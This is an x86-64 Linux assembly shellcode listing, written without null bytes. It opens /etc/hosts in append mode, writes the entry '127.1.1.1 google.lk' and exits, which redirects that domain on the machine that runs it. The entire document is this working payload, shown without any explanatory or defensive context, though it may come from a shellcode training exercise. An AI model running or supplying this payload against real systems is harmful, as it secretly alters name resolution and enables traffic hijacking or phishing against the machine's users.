global _start
    section .text

_start:
    ;open
    xor rax, rax 
    add rax, 2  ; open syscall
    xor rdi, rdi
    xor rsi, rsi
    push rsi ; 0x00 
    mov r8, 0x2f2f2f2f6374652f ; stsoh/
    mov r10, 0x7374736f682f2f2f ; /cte/
    push r10
    push r8
    add rdi, rsp
    xor rsi, rsi
    add si, 0x401
    syscall

    ;write
    xchg rax, rdi
    xor rax, rax
    add rax, 1 ; syscall for write
    jmp data

write:
    pop rsi 
    mov dl, 19 ; length in rdx
    syscall

    ;close
    xor rax, rax
    add rax, 3
    syscall

    ;exit
    xor rax, rax
    mov al, 60
    xor rdi, rdi
    syscall 

data:
    call write
    text db '127.1.1.1 google.lk'